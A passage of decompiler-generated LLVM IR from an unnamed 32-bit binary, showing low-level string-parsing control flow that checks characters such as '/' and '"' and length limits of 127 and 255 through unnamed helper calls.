  %v3_10001804 = load i8, i8* %v2_10001804, align 1
  %v4_10001804 = zext i8 %v3_10001804 to i32
  store i32 %v4_10001804, i32* %r0.global-to-local, align 4
  %v1_10001808 = icmp ult i8 %v3_10001804, 115
  %v2_10001808 = icmp ugt i8 %v3_10001804, 115
  %v3_10001808 = icmp eq i8 %v3_10001804, 115
  store i1 %v1_10001808, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10001808, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10001808, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10001808, label %dec_label_pc_10001a5c, label %dec_label_pc_10001810

dec_label_pc_10001810:                            ; preds = %dec_label_pc_100017fc, %dec_label_pc_10001a5c
  %v0_10001814 = phi i32 [ %v0_10001804, %dec_label_pc_100017fc ], [ %v0_10001814.pre, %dec_label_pc_10001a5c ]
  %v0_10001810 = load i32, i32* @r1, align 4
  %v1_10001810 = add i32 %v0_10001810, 8
  %v2_10001810 = inttoptr i32 %v1_10001810 to i32*
  %v3_10001810 = load i32, i32* %v2_10001810, align 4
  store i32 %v0_10001814, i32* %r3.global-to-local, align 4
  %v1_10001818 = load i32, i32* %r28.global-to-local, align 4
  %v2_10001818 = sub i32 %v1_10001818, %v3_10001810
  %v2_1000181c = add i32 %v3_10001810, %v0_10001814
  store i32 %v2_1000181c, i32* %r4.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10001824.46 to i32), i32* @lr, align 4
  %v3_10001820 = call i32 @function_10008564(i32 %v0_10001814, i32 %v2_1000181c, i32 %v2_10001818)
  store i32 %v3_10001820, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  %v1_10001828 = load i32, i32* @r1, align 4
  %v2_10001828 = add i32 %v1_10001828, 8
  %v3_10001828 = inttoptr i32 %v2_10001828 to i32*
  store i32 0, i32* %v3_10001828, align 4
  %v0_1000182c = load i32, i32* %r20.global-to-local, align 4
  %v1_1000182c = load i32, i32* @r31, align 4
  %v2_1000182c = add i32 %v1_1000182c, %v0_1000182c
  %v3_1000182c = inttoptr i32 %v2_1000182c to i8*
  %v4_1000182c = load i8, i8* %v3_1000182c, align 1
  %v5_1000182c = zext i8 %v4_1000182c to i32
  store i32 %v5_1000182c, i32* %r3.global-to-local, align 4
  %v2_10001830 = icmp ne i8 %v4_1000182c, 0
  %v3_10001830 = icmp eq i8 %v4_1000182c, 0
  store i1 false, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10001830, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10001830, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10001830, label %dec_label_pc_10001870, label %dec_label_pc_10001838

dec_label_pc_10001838:                            ; preds = %dec_label_pc_10001810
  %v1_10001838 = icmp ult i8 %v4_1000182c, 47
  %v2_10001838 = icmp ugt i8 %v4_1000182c, 47
  %v3_10001838 = icmp eq i8 %v4_1000182c, 47
  store i1 %v1_10001838, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10001838, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10001838, i1* %cr7_eq.global-to-local, align 1
  %v0_1000183c = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_1000183c, i32* %r9.global-to-local, align 4
  br i1 %v3_10001838, label %dec_label_pc_100019c0, label %dec_label_pc_10001844

dec_label_pc_10001844:                            ; preds = %dec_label_pc_10001838
  store i32 1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10001858

dec_label_pc_1000184c:                            ; preds = %dec_label_pc_10001858
  %v1_1000184c = icmp ult i8 %v4_10001864, 47
  %v2_1000184c = icmp ugt i8 %v4_10001864, 47
  %v3_1000184c = icmp eq i8 %v4_10001864, 47
  store i1 %v1_1000184c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_1000184c, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_1000184c, i1* %cr7_eq.global-to-local, align 1
  %v1_10001850 = add i32 %v0_1000185c, 1
  store i32 %v1_10001850, i32* %r4.global-to-local, align 4
  br i1 %v3_1000184c, label %dec_label_pc_100019c0, label %dec_label_pc_10001858

dec_label_pc_10001858:                            ; preds = %dec_label_pc_1000184c, %dec_label_pc_10001844
  %v0_10001858 = phi i32 [ %v1_10001850, %dec_label_pc_1000184c ], [ 1, %dec_label_pc_10001844 ]
  %v1_10001858 = load i32, i32* @r1, align 4
  %v2_10001858 = add i32 %v1_10001858, 8
  %v3_10001858 = inttoptr i32 %v2_10001858 to i32*
  store i32 %v0_10001858, i32* %v3_10001858, align 4
  %v0_1000185c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1000185c, i32* %r11.global-to-local, align 4
  %v0_10001860 = load i32, i32* %r29.global-to-local, align 4
  %v2_10001860 = add i32 %v0_10001860, %v0_1000185c
  store i32 %v2_10001860, i32* %r9.global-to-local, align 4
  %v3_10001864 = inttoptr i32 %v2_10001860 to i8*
  %v4_10001864 = load i8, i8* %v3_10001864, align 1
  %v5_10001864 = zext i8 %v4_10001864 to i32
  store i32 %v5_10001864, i32* %r0.global-to-local, align 4
  %v2_10001868 = icmp ne i8 %v4_10001864, 0
  %v3_10001868 = icmp eq i8 %v4_10001864, 0
  store i1 false, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10001868, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10001868, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10001868, label %dec_label_pc_10001870, label %dec_label_pc_1000184c

dec_label_pc_10001870:                            ; preds = %dec_label_pc_10001858, %dec_label_pc_10001810, %dec_label_pc_100019c0
  %v0_10001870 = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_10001870, i32* %r3.global-to-local, align 4
  store i32 268441720, i32* @lr, align 4
  %v1_10001874 = inttoptr i32 %v0_10001870 to i8*
  %v2_10001874 = call i32 @function_100074dc(i8* %v1_10001874)
  store i32 %v2_10001874, i32* %r3.global-to-local, align 4
  %v1_10001878 = icmp slt i32 %v2_10001874, 0
  %v2_10001878 = icmp sgt i32 %v2_10001874, 0
  %v3_10001878 = icmp eq i32 %v2_10001874, 0
  store i1 %v1_10001878, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10001878, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10001878, i1* %cr7_eq.global-to-local, align 1
  %tmp86 = icmp slt i32 %v2_10001874, 1
  br i1 %tmp86, label %dec_label_pc_1000189c, label %dec_label_pc_10001880

dec_label_pc_10001880:                            ; preds = %dec_label_pc_10001870
  %v0_10001880 = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_10001880, i32* %r3.global-to-local, align 4
  store i32 268441736, i32* @lr, align 4
  %v1_10001884 = inttoptr i32 %v0_10001880 to i8*
  %v2_10001884 = call i32 @function_100074dc(i8* %v1_10001884)
  store i32 %v2_10001884, i32* %r3.global-to-local, align 4
  %v1_10001888 = icmp slt i32 %v2_10001884, 127
  %v2_10001888 = icmp sgt i32 %v2_10001884, 127
  %v3_10001888 = icmp eq i32 %v2_10001884, 127
  store i1 %v1_10001888, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10001888, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10001888, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_10001888, label %dec_label_pc_1000189c, label %dec_label_pc_10001890

dec_label_pc_10001890:                            ; preds = %dec_label_pc_10001880
  %v0_10001890 = load i32, i32* %r23.global-to-local, align 4
  %v1_10001890 = add i32 %v0_10001890, 789
  store i32 %v1_10001890, i32* @r3, align 4
  %v0_10001894 = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_10001894, i32* %r4.global-to-local, align 4
  store i32 268441756, i32* %lr.global-to-local, align 4
  %v2_10001898 = inttoptr i32 %v1_10001890 to i8*
  %v3_10001898 = call i32 @function_10007504(i8* %v2_10001898, i32 %v0_10001894)
  store i32 %v3_10001898, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000189c

dec_label_pc_1000189c:                            ; preds = %dec_label_pc_10001880, %dec_label_pc_10001870, %dec_label_pc_10001890
  %v0_1000189c = load i32, i32* @r1, align 4
  %v1_1000189c = add i32 %v0_1000189c, 8
  %v2_1000189c = inttoptr i32 %v1_1000189c to i32*
  %v3_1000189c = load i32, i32* %v2_1000189c, align 4
  %v0_100018a0 = load i32, i32* %r29.global-to-local, align 4
  %v2_100018a0 = add i32 %v3_1000189c, 1
  %v1_100018a4 = add i32 %v2_100018a0, %v0_100018a0
  store i32 %v1_100018a4, i32* %r3.global-to-local, align 4
  store i32 268441772, i32* @lr, align 4
  %v1_100018a8 = inttoptr i32 %v1_100018a4 to i8*
  %v2_100018a8 = call i32 @function_100074dc(i8* %v1_100018a8)
  store i32 %v2_100018a8, i32* %r3.global-to-local, align 4
  %v1_100018ac = icmp slt i32 %v2_100018a8, 255
  %v2_100018ac = icmp sgt i32 %v2_100018a8, 255
  %v3_100018ac = icmp eq i32 %v2_100018a8, 255
  store i1 %v1_100018ac, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_100018ac, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_100018ac, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_100018ac, label %dec_label_pc_100011e4, label %dec_label_pc_100018b4

dec_label_pc_100018b4:                            ; preds = %dec_label_pc_1000189c
  %v0_100018b4 = load i32, i32* @r30, align 4
  store i32 %v0_100018b4, i32* @r3, align 4
  store i32 255, i32* @r4, align 4
  store i32 268441792, i32* @lr, align 4
  %v0_100018bc = call i32 @function_10007584()
  store i32 %v0_100018bc, i32* %r3.global-to-local, align 4
  %v0_100018c0 = load i32, i32* @r1, align 4
  %v1_100018c0 = add i32 %v0_100018c0, 8
  %v2_100018c0 = inttoptr i32 %v1_100018c0 to i32*
  %v3_100018c0 = load i32, i32* %v2_100018c0, align 4
  %v0_100018c4 = load i32, i32* %r29.global-to-local, align 4
  %v2_100018c4 = add i32 %v3_100018c0, 1
  %v1_100018c8 = add i32 %v2_100018c4, %v0_100018c4
  store i32 %v1_100018c8, i32* %r3.global-to-local, align 4
  store i32 268441808, i32* @lr, align 4
  %v1_100018cc = inttoptr i32 %v1_100018c8 to i8*
  %v2_100018cc = call i32 @function_100074dc(i8* %v1_100018cc)
  store i32 %v2_100018cc, i32* %r3.global-to-local, align 4
  %v1_100018d0 = icmp slt i32 %v2_100018cc, 0
  %v2_100018d0 = icmp sgt i32 %v2_100018cc, 0
  %v3_100018d0 = icmp eq i32 %v2_100018cc, 0
  store i1 %v1_100018d0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_100018d0, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_100018d0, i1* %cr7_eq.global-to-local, align 1
  %tmp87 = icmp slt i32 %v2_100018cc, 1
  br i1 %tmp87, label %dec_label_pc_100011e4, label %dec_label_pc_100018d8

dec_label_pc_100018d8:                            ; preds = %dec_label_pc_10001a40, %dec_label_pc_100018b4
  %v0_100018d8 = load i32, i32* @r1, align 4
  %v1_100018d8 = add i32 %v0_100018d8, 8
  %v2_100018d8 = inttoptr i32 %v1_100018d8 to i32*
  %v3_100018d8 = load i32, i32* %v2_100018d8, align 4
  %v0_100018dc = load i32, i32* @r30, align 4
  store i32 %v0_100018dc, i32* @r3, align 4
  %v0_100018e0 = load i32, i32* %r29.global-to-local, align 4
  %v2_100018e0 = add i32 %v3_100018d8, 1
  %v1_100018e4 = add i32 %v2_100018e0, %v0_100018e0
  store i32 %v1_100018e4, i32* %r4.global-to-local, align 4
  store i32 268441836, i32* %lr.global-to-local, align 4
  %v2_100018e8 = inttoptr i32 %v0_100018dc to i8*
  %v3_100018e8 = call i32 @function_10007504(i8* %v2_100018e8, i32 %v1_100018e4)
  store i32 %v3_100018e8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100011e4

dec_label_pc_100018f0:                            ; preds = %dec_label_pc_10000ca8
  %v0_100018f0 = load i32, i32* @r30, align 4
  %v1_100018f0 = add i32 %v0_100018f0, -533
  %v2_100018f0 = inttoptr i32 %v1_100018f0 to i32*
  %v3_100018f0 = load i32, i32* %v2_100018f0, align 4
  store i32 %v3_100018f0, i32* %r3.global-to-local, align 4
  store i32 268441848, i32* @lr, align 4
  %v0_100018f4 = call i32 @function_10007d68()
  store i32 -1, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_10001900 = load i32, i32* @r30, align 4
  %v2_10001900 = add i32 %v1_10001900, -533
  %v3_10001900 = inttoptr i32 %v2_10001900 to i32*
  store i32 -1, i32* %v3_10001900, align 4
  %v0_10001904 = load i32, i32* %r0.global-to-local, align 4
  %v1_10001904 = trunc i32 %v0_10001904 to i8
  %v2_10001904 = load i32, i32* @r30, align 4
  %v3_10001904 = add i32 %v2_10001904, -529
  %v4_10001904 = inttoptr i32 %v3_10001904 to i8*
  store i8 %v1_10001904, i8* %v4_10001904, align 1
  br label %dec_label_pc_10000824

dec_label_pc_1000190c:                            ; preds = %dec_label_pc_1000154c
  %v0_1000190c = load i32, i32* @r30, align 4
  %v1_1000190c = add i32 %v0_1000190c, -529
  %v2_1000190c = inttoptr i32 %v1_1000190c to i8*
  %v3_1000190c = load i8, i8* %v2_1000190c, align 1
  %v4_1000190c = zext i8 %v3_1000190c to i32
  store i32 %v4_1000190c, i32* %r0.global-to-local, align 4
  %v2_10001910 = icmp ne i8 %v3_1000190c, 0
  %v3_10001910 = icmp eq i8 %v3_1000190c, 0
  store i1 false, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10001910, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10001910, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10001910, label %dec_label_pc_10000824, label %dec_label_pc_100011e4

dec_label_pc_1000191c:                            ; preds = %dec_label_pc_1000177c
  store i32 268500992, i32* %r9.global-to-local, align 4
  %v0_10001920 = load i32, i32* @r31, align 4
  store i32 %v0_10001920, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1000a7b8.7 to i32), i32* %r4.global-to-local, align 4
  store i32 268441900, i32* %lr.global-to-local, align 4
  %v3_10001928 = inttoptr i32 %v0_10001920 to i8*
  %v4_10001928 = call i32 @function_10007938(i8* %v3_10001928, i32 ptrtoint ([4 x i8]* @global_var_1000a7b8.7 to i32))
  store i32 %v4_10001928, i32* %r3.global-to-local, align 4
  %v1_1000192c = icmp slt i32 %v4_10001928, 0
  %v2_1000192c = icmp sgt i32 %v4_10001928, 0
  %v3_1000192c = icmp eq i32 %v4_10001928, 0
  store i1 %v1_1000192c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_1000192c, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_1000192c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000192c, label %dec_label_pc_10001934, label %dec_label_pc_100017b4

dec_label_pc_10001934:                            ; preds = %dec_label_pc_1000191c
  %v0_10001934 = load i32, i32* %r24.global-to-local, align 4
  %v1_10001934 = load i32, i32* %r29.global-to-local, align 4
  %v2_10001934 = icmp slt i32 %v0_10001934, %v1_10001934
  %v3_10001934 = icmp sgt i32 %v0_10001934, %v1_10001934
  %v4_10001934 = icmp eq i32 %v0_10001934, %v1_10001934
  store i1 %v2_10001934, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10001934, i1* %cr7_gt.global-to-local, align 1
  store i1 %v4_10001934, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10001934, label %dec_label_pc_1000193c, label %dec_label_pc_10001b78

dec_label_pc_1000193c:                            ; preds = %dec_label_pc_10001934
  store i32 10, i32* %r0.global-to-local, align 4
  %v2_10001940 = load i32, i32* @r30, align 4
  %v3_10001940 = add i32 %v2_10001940, -529
  %v4_10001940 = inttoptr i32 %v3_10001940 to i8*
  store i8 10, i8* %v4_10001940, align 1
  br label %dec_label_pc_100017bc

dec_label_pc_10001948:                            ; preds = %dec_label_pc_1000142c
  %v1_10001948 = add i32 %v0_10001454, 1579
  %v2_10001948 = inttoptr i32 %v1_10001948 to i32*
  %v3_10001948 = load i32, i32* %v2_10001948, align 4
  store i32 %v3_10001948, i32* %r29.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 36, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r26.global-to-local, align 4
  store i32 268441948, i32* %lr.global-to-local, align 4
  %v3_10001958 = call i32 @function_10006bb0(i32 36, i32* null)
  %v0_1000195c = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_1000195c, i32* %r4.global-to-local, align 4
  %v0_10001968 = load i32, i32* %r27.global-to-local, align 4
  store i32 %v0_10001968, i32* %r3.global-to-local, align 4
  store i32 268441968, i32* %lr.global-to-local, align 4
  %v4_1000196c = call i32 @function_100075a8(i32 %v0_10001968, i32 %v0_1000195c, i32 %v3_10001958, i32 11)
  store i32 %v4_1000196c, i32* %r3.global-to-local, align 4
  store i32 268500992, i32* %r9.global-to-local, align 4
  %v0_10001974 = load i32, i32* @r30, align 4
  %v1_10001974 = add i32 %v0_10001974, 1579
  %v2_10001974 = inttoptr i32 %v1_10001974 to i32*
  %v3_10001974 = load i32, i32* %v2_10001974, align 4
  %v0_10001978 = load i32, i32* %r27.global-to-local, align 4
  %v2_10001978 = add i32 %v0_10001978, %v4_1000196c
  store i32 %v2_10001978, i32* %r31.global-to-local, align 4
  store i32 %v4_1000196c, i32* %r29.global-to-local, align 4
  %v2_10001984 = sub i32 %v3_10001974, %v4_1000196c
  store i32 %v2_10001984, i32* %r4.global-to-local, align 4
  store i32 %v2_10001978, i32* %r3.global-to-local, align 4
  store i32 268442004, i32* %lr.global-to-local, align 4
  %v4_10001990 = call i32 @function_100075a8(i32 %v2_10001978, i32 %v2_10001984, i32 ptrtoint (i32* @global_var_1000a7f4.47 to i32), i32 1)
  store i32 %v4_10001990, i32* %r3.global-to-local, align 4
  %v0_10001994 = load i32, i32* @r30, align 4
  %v1_10001994 = add i32 %v0_10001994, 935
  %v2_10001994 = inttoptr i32 %v1_10001994 to i32*
  %v3_10001994 = load i32, i32* %v2_10001994, align 4
  store i32 %v3_10001994, i32* %r0.global-to-local, align 4
  %v0_10001998 = load i32, i32* %r29.global-to-local, align 4
  %v2_10001998 = add i32 %v0_10001998, %v4_10001990
  store i32 %v2_10001998, i32* %r28.global-to-local, align 4
  %v1_1000199c = icmp slt i32 %v3_10001994, 4
  %v2_1000199c = icmp sgt i32 %v3_10001994, 4
  %v3_1000199c = icmp eq i32 %v3_10001994, 4
  store i1 %v1_1000199c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_1000199c, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_1000199c, i1* %cr7_eq.global-to-local, align 1
  %v1_100019a0 = load i32, i32* %r23.global-to-local, align 4
  %v2_100019a0 = add i32 %v1_100019a0, %v2_10001998
  store i32 %v2_100019a0, i32* %r9.global-to-local, align 4
  %v0_100019a4 = load i32, i32* %r26.global-to-local, align 4
  %v1_100019a4 = trunc i32 %v0_100019a4 to i8
  %v3_100019a4 = add i32 %v2_100019a0, 2115
  %v4_100019a4 = inttoptr i32 %v3_100019a4 to i8*
  store i8 %v1_100019a4, i8* %v4_100019a4, align 1
  %v0_100019a8 = load i1, i1* %cr7_eq.global-to-local, align 1
  %v1_100019a8 = load i1, i1* %cr7_lt.global-to-local, align 1
  %v2_100019a8 = or i1 %v0_100019a8, %v1_100019a8
  br i1 %v2_100019a8, label %dec_label_pc_10001b90, label %dec_label_pc_100019ac

dec_label_pc_100019ac:                            ; preds = %dec_label_pc_10001b90, %dec_label_pc_10001948, %dec_label_pc_10001ba0
  store i32 10, i32* %r0.global-to-local, align 4
  %v1_100019b4 = load i32, i32* @r30, align 4
  %v2_100019b4 = add i32 %v1_100019b4, 931
  %v3_100019b4 = inttoptr i32 %v2_100019b4 to i32*
  store i32 -1, i32* %v3_100019b4, align 4
  %v0_100019b8 = load i32, i32* %r0.global-to-local, align 4
  %v1_100019b8 = trunc i32 %v0_100019b8 to i8
  %v2_100019b8 = load i32, i32* @r30, align 4
  %v3_100019b8 = add i32 %v2_100019b8, -529
  %v4_100019b8 = inttoptr i32 %v3_100019b8 to i8*
  store i8 %v1_100019b8, i8* %v4_100019b8, align 1
  br label %dec_label_pc_10000824

dec_label_pc_100019c0:                            ; preds = %dec_label_pc_1000184c, %dec_label_pc_10001838
  %v2_100019c4 = phi i32 [ %v0_1000183c, %dec_label_pc_10001838 ], [ %v2_10001860, %dec_label_pc_1000184c ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v3_100019c4 = inttoptr i32 %v2_100019c4 to i8*
  store i8 0, i8* %v3_100019c4, align 1
  br label %dec_label_pc_10001870

dec_label_pc_100019cc:                            ; preds = %dec_label_pc_10001680
  store i32 %v3_100019cc, i32* %r11.global-to-local, align 4
  %v0_100019d0 = load i32, i32* @r28, align 4
  %v2_100019d0 = add i32 %v0_100019d0, %v3_100019cc
  %v3_100019d0 = inttoptr i32 %v2_100019d0 to i8*
  %v4_100019d0 = load i8, i8* %v3_100019d0, align 1
  %v5_100019d0 = zext i8 %v4_100019d0 to i32
  store i32 %v5_100019d0, i32* %r0.global-to-local, align 4
  %v1_100019d4 = icmp ult i8 %v4_100019d0, 34
  %v2_100019d4 = icmp ugt i8 %v4_100019d0, 34
  %v3_100019d4 = icmp eq i8 %v4_100019d0, 34
  store i1 %v1_100019d4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_100019d4, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_100019d4, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100019d4, label %dec_label_pc_100019dc, label %dec_label_pc_100016e4

dec_label_pc_100019dc:                            ; preds = %dec_label_pc_100016ac.dec_label_pc_100019dc_crit_edge, %dec_label_pc_100019cc
  %v1_100019e4 = phi i32 [ %v0_100019cc, %dec_label_pc_100019cc ], [ %v1_100019e4.pre, %dec_label_pc_100016ac.dec_label_pc_100019dc_crit_edge ]
  %v0_100019e0 = phi i32 [ %v0_100019d0, %dec_label_pc_100019cc ], [ %v0_100016d8, %dec_label_pc_100016ac.dec_label_pc_100019dc_crit_edge ]
  %v0_100019dc = phi i32 [ %v3_100019cc, %dec_label_pc_100019cc ], [ %v1_100016d8, %dec_label_pc_100016ac.dec_label_pc_100019dc_crit_edge ]
  %v1_100019dc = add i32 %v0_100019dc, 1
  store i32 %v1_100019dc, i32* %r11.global-to-local, align 4
  %v2_100019e0 = add i32 %v1_100019dc, %v0_100019e0
  store i32 %v2_100019e0, i32* %r29.global-to-local, align 4
  %v2_100019e4 = add i32 %v1_100019e4, 8
  %v3_100019e4 = inttoptr i32 %v2_100019e4 to i32*
  store i32 %v1_100019dc, i32* %v3_100019e4, align 4
  %v0_100019e8 = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_100019e8, i32* %r3.global-to-local, align 4
  store i32 268442096, i32* @lr, align 4
  %v1_100019ec = inttoptr i32 %v0_100019e8 to i8*
  %v2_100019ec = call i32 @function_100074dc(i8* %v1_100019ec)
  store i32 %v2_100019ec, i32* %r3.global-to-local, align 4
  %v0_100019f0 = load i32, i32* %r29.global-to-local, align 4
  %v2_100019f0 = add i32 %v0_100019f0, %v2_100019ec
  store i32 %v2_100019f0, i32* %r29.global-to-local, align 4
  %v1_100019f4 = add i32 %v2_100019f0, -1
  %v2_100019f4 = inttoptr i32 %v1_100019f4 to i8*
  %v3_100019f4 = load i8, i8* %v2_100019f4, align 1
  %v4_100019f4 = zext i8 %v3_100019f4 to i32
  store i32 %v4_100019f4, i32* %r0.global-to-local, align 4
  %v1_100019f8 = icmp ult i8 %v3_100019f4, 34
  %v2_100019f8 = icmp ugt i8 %v3_100019f4, 34
  %v3_100019f8 = icmp eq i8 %v3_100019f4, 34
  store i1 %v1_100019f8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_100019f8, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_100019f8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100019f8, label %dec_label_pc_10001a00, label %dec_label_pc_100016e4

dec_label_pc_10001a00:                            ; preds = %dec_label_pc_100019dc
  %v0_10001a00 = load i32, i32* @r1, align 4
  %v1_10001a00 = add i32 %v0_10001a00, 8
  %v2_10001a00 = inttoptr i32 %v1_10001a00 to i32*
  %v3_10001a00 = load i32, i32* %v2_10001a00, align 4
  %v0_10001a04 = load i32, i32* @r28, align 4
  %v2_10001a04 = add i32 %v0_10001a04, %v3_10001a00
  store i32 %v2_10001a04, i32* %r29.global-to-local, align 4
  store i32 %v2_10001a04, i32* %r3.global-to-local, align 4
  store i32 268442128, i32* @lr, align 4
  %v1_10001a0c = inttoptr i32 %v2_10001a04 to i8*
  %v2_10001a0c = call i32 @function_100074dc(i8* %v1_10001a0c)
  store i32 %v2_10001a0c, i32* %r3.global-to-local, align 4
  %v0_10001a10 = load i32, i32* %r29.global-to-local, align 4
  %v2_10001a10 = add i32 %v0_10001a10, %v2_10001a0c
  store i32 %v2_10001a10, i32* %r29.global-to-local, align 4
  %v0_10001a14 = load i32, i32* %r26.global-to-local, align 4
  %v1_10001a14 = trunc i32 %v0_10001a14 to i8
  %v3_10001a14 = add i32 %v2_10001a10, -1
  %v4_10001a14 = inttoptr i32 %v3_10001a14 to i8*
  store i8 %v1_10001a14, i8* %v4_10001a14, align 1
  br label %dec_label_pc_100016e4

dec_label_pc_10001a1c:                            ; preds = %dec_label_pc_100011d8
  %v0_10001a1c = load i32, i32* @r30, align 4
  store i32 %v0_10001a1c, i32* @r3, align 4
  store i32 255, i32* @r4, align 4
  store i32 268442152, i32* @lr, align 4
  %v0_10001a24 = call i32 @function_10007584()
  store i32 %v0_10001a24, i32* %r3.global-to-local, align 4
  %v0_10001a28 = load i32, i32* @r1, align 4
  %v1_10001a28 = add i32 %v0_10001a28, 8
  %v2_10001a28 = inttoptr i32 %v1_10001a28 to i32*
  %v3_10001a28 = load i32, i32* %v2_10001a28, align 4
  %v0_10001a2c = load i32, i32* %r29.global-to-local, align 4
  %v2_10001a2c = add i32 %v3_10001a28, 1
  %v1_10001a30 = add i32 %v2_10001a2c, %v0_10001a2c
  store i32 %v1_10001a30, i32* %r3.global-to-local, align 4
  store i32 268442168, i32* @lr, align 4
  %v1_10001a34 = inttoptr i32 %v1_10001a30 to i8*
  %v2_10001a34 = call i32 @function_100074dc(i8* %v1_10001a34)
  store i32 %v2_10001a34, i32* %r3.global-to-local, align 4
  %v1_10001a38 = icmp slt i32 %v2_10001a34, 0
  %v2_10001a38 = icmp sgt i32 %v2_10001a34, 0
  %v3_10001a38 = icmp eq i32 %v2_10001a34, 0
  store i1 %v1_10001a38, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10001a38, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10001a38, i1* %cr7_eq.global-to-local, align 1
  %tmp88 = icmp slt i32 %v2_10001a34, 1
  br i1 %tmp88, label %dec_label_pc_100011e4, label %dec_label_pc_10001a40

dec_label_pc_10001a40:                            ; preds = %dec_label_pc_10001a1c
  %v0_10001a40 = load i32, i32* @r1, align 4
  %v1_10001a40 = add i32 %v0_10001a40, 8
  %v2_10001a40 = inttoptr i32 %v1_10001a40 to i32*
  %v3_10001a40 = load i32, i32* %v2_10001a40, align 4
  %v0_10001a44 = load i32, i32* %r29.global-to-local, align 4
  %v2_10001a44 = add i32 %v3_10001a40, 1
  %v1_10001a48 = add i32 %v2_10001a44, %v0_10001a44
  store i32 %v1_10001a48, i32* %r3.global-to-local, align 4
  store i32 268442192, i32* @lr, align 4
  %v1_10001a4c = inttoptr i32 %v1_10001a48 to i8*
  %v2_10001a4c = call i32 @function_100074dc(i8* %v1_10001a4c)
  store i32 %v2_10001a4c, i32* %r3.global-to-local, align 4
  %v1_10001a50 = icmp slt i32 %v2_10001a4c, 255
  %v2_10001a50 = icmp sgt i32 %v2_10001a4c, 255
  %v3_10001a50 = icmp eq i32 %v2_10001a4c, 255
  store i1 %v1_10001a50, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10001a50, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10001a50, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_10001a50, label %dec_label_pc_100011e4, label %dec_label_pc_100018d8

dec_label_pc_10001a5c:                            ; preds = %dec_label_pc_100017fc
  store i32 8, i32* %r11.global-to-local, align 4
  %v1_10001a60 = load i32, i32* @r1, align 4
  %v2_10001a60 = add i32 %v1_10001a60, 8
  %v3_10001a60 = inttoptr i32 %v2_10001a60 to i32*
  store i32 8, i32* %v3_10001a60, align 4
  %v0_10001814.pre = load i32, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_10001810

dec_label_pc_10001a68:                            ; preds = %dec_label_pc_10001b4c, %dec_label_pc_10001b38
  %v2_10001a6c = phi i32 [ %v0_10001b3c, %dec_label_pc_10001b38 ], [ %v2_10001b5c, %dec_label_pc_10001b4c ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v3_10001a6c = inttoptr i32 %v2_10001a6c to i8*
  store i8 0, i8* %v3_10001a6c, align 1
  br label %dec_label_pc_10001a70

dec_label_pc_10001a70:                            ; preds = %dec_label_pc_10001b58, %dec_label_pc_10001b0c, %dec_label_pc_10001a68
  %v0_10001a70 = load i32, i32* @r31, align 4
  store i32 %v0_10001a70, i32* %r3.global-to-local, align 4
  store i32 268442232, i32* @lr, align 4
  %v1_10001a74 = inttoptr i32 %v0_10001a70 to i8*
  %v2_10001a74 = call i32 @function_100074dc(i8* %v1_10001a74)
  store i32 %v2_10001a74, i32* %r3.global-to-local, align 4
  %v1_10001a78 = icmp slt i32 %v2_10001a74, 0
